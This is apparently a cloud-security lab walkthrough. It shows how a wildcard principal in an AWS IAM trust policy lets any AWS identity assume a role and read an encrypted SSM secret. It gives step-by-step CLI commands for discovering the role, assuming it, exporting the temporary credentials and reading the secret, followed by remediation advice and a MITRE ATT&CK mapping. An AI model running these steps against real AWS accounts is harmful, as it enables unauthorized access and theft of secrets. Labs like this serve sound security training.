# STS AssumeRole — Wildcard Principal

**Difficulty:** Intermediate | **Provider:** AWS | **Category:** IAM / Privilege Escalation

## Scenario

A developer created an IAM role to allow cross-account access for a vendor integration.
They mistakenly set the trust policy principal to `"AWS": "*"` — allowing **any** AWS
identity in any account to assume the role without further conditions.

The role has access to an SSM SecureString parameter containing a production secret.
Your starting identity has `iam:ListRoles` and `sts:AssumeRole` permissions.

## Attack Path

```
[Attacker] sts-attacker-<id> (iam:ListRoles + sts:AssumeRole)
    |
    v
aws iam list-roles  -->  find cumulonimbus-app-role-* with Principal {"AWS": "*"}
    |
    v
aws sts assume-role --role-arn <arn> --role-session-name pwned
    |
    v
Export temporary credentials (AccessKeyId, SecretAccessKey, SessionToken)
    |
    v
aws ssm get-parameter --name /cumulonimbus/sts_assume_role_any/flag --with-decryption
    |
    v
Value  -->  flag
```

### Step 1 — Configure the attacker profile

```bash
aws configure --profile attacker   # region: eu-west-1
```

### Step 2 — Find the misconfigured role

```bash
aws iam list-roles \
  --profile attacker \
  --query "Roles[?contains(RoleName, 'cumulonimbus')].{Name:RoleName,Arn:Arn,Trust:AssumeRolePolicyDocument}"
```

### Step 3 — Assume the role

```bash
ROLE_ARN=$(aws iam list-roles \
  --profile attacker \
  --query "Roles[?contains(RoleName, 'cumulonimbus-app-role')].Arn" \
  --output text)

CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_ARN}" \
  --role-session-name pentest \
  --profile attacker)

export AWS_ACCESS_KEY_ID=$(echo "${CREDS}" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "${CREDS}" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "${CREDS}" | jq -r '.Credentials.SessionToken')
export AWS_DEFAULT_REGION=eu-west-1
```

### Step 4 — Read the flag

```bash
aws ssm get-parameter \
  --name /cumulonimbus/sts_assume_role_any/flag \
  --with-decryption \
  --query "Parameter.Value" \
  --output text
```

## How to Fix in Production

1. **Never use `"Principal": {"AWS": "*"}`** without an `aws:PrincipalOrgID` or
   `aws:SourceAccount` condition — this opens the role to the entire internet.
2. **Scope trust policies** to specific account IDs or role ARNs:
   ```json
   "Principal": {"AWS": "arn:aws:iam::123456789012:root"}
   ```
3. **Add `sts:ExternalId` conditions** for third-party cross-account roles to prevent
   the confused deputy problem.
4. **Audit trust policies** regularly:
   ```bash
   aws iam list-roles --query "Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS=='*']]"
   ```
5. **Use AWS IAM Access Analyzer** to automatically flag overly permissive trust policies.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
| Cloud Infrastructure Discovery | [T1580](https://attack.mitre.org/techniques/T1580/) |
| Privilege Escalation via Cloud Services | [T1548](https://attack.mitre.org/techniques/T1548/) |
